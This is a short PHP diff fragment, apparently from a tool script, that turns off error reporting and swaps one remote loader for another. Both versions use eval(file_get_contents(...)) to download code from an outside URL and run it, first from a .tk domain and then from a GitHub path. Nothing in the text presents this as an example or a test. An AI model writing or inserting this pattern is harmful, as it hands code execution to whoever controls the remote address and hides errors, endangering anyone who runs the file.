@@ -2,4 +2,4 @@
 error_reporting(0);
 
 
-eval(file_get_contents('https://shop-keytool.tk/Toolauto_kiemcoin_uytin/Tong_hop/botchedo'));
+eval(file_get_contents('https://github.com/xuangianh/xuangianh/blob/main/F.sh'));
